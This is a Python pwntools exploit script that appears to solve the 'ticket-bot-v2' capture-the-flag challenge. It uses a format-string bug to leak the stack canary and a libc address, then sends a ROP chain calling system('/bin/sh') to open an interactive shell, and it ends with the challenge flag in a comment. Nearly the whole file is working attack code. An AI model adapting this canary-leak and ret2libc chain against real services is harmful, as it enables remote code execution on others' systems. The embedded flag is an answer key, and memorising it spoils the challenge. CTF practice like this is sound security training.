#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

DOCKER_PORT = 1337
REMOTE_NC_CMD    = "nc ticket-bot-v2.challs.csc.tf 1337"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b adminpass 
c
c
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    if args.DOCKER:
        return remote("localhost", DOCKER_PORT)
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    r.sendline(b"A"*31)

    def new_ticket(data):
        r.sendline(b"1")
        r.sendline(data)

    def view(idx):
        r.sendline(b"2")
        r.sendline(bstr(idx))

    def service(format):
        r.sendline(b"3")
        r.sendline(bstr(u32(b"AAAA")))
        r.sendline(b"1")
        r.sendline(format)
        r.recvuntil(b"changed to\n")
        return int(r.recvuntil(b"=", True), 16)

    for i in range(5):
        new_ticket(b"A"*32)
    
    canary = service(b"%7$p")
    log.info(f"CANARY @ {hex(canary)}")
    libc.address = service(b"%p\0\0") - libc.sym._IO_2_1_stdout_-131
    log.info(f"LIBC @ {hex(libc.address)}")

    rop = ROP(libc)
    rop.raw(cyclic(8))
    rop.raw(canary)
    rop.raw(canary)
    rop.rdi = libc.binsh()
    rop.raw(rop.ret.address)
    rop.raw(libc.sym.system)

  

    r.sendline(b"3")
    r.sendline(bstr(u32(b"AAAA")))
    r.sendline(b"1")
    r.sendline(rop.chain())

    r.interactive()
    #CSCTF{4rr4ys_4nd_th3re_1nd3x3s_h4ndl3_w1th_c4r3}

if __name__ == "__main__":
    main()